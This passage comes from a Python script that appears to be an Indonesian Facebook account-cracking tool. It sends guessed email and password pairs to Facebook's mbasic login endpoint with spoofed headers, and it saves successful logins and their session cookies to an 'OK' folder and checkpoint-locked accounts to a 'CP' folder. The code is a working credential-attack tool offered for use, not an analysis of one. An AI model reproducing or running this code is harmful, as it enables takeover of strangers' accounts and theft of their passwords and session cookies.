b%3Dfdaa6531e7d872ef4%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff462ff7f32d3f5c0a%26relation%3Dopener%26frame%3Dfde927a29a637d339%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1715269117&hrc=1&wtsid=rdr_09E1IX1K9lXOTDHnK&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}Email : {K}{idf}{N}\nPassword : {K}{pw}{N}\nUser-Agent :{K} {ua}{N}\n')     
				#os.popen("play-audio .cp.mp3")
				open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}Email : {H}{idf}{N}\nPassworr : {K}{pw}\nCookie : {H}{kuki}{N}/nUser-Agent : {H}{ua}{N}\n')
				#os.popen("play-audio .ok.mp3")
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
######## [ AYAM GAJAGO ] ########
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMPZ')
	except:pass
	menu()
######## [ AYAM JAGO BANGETT KKKKK ] ########
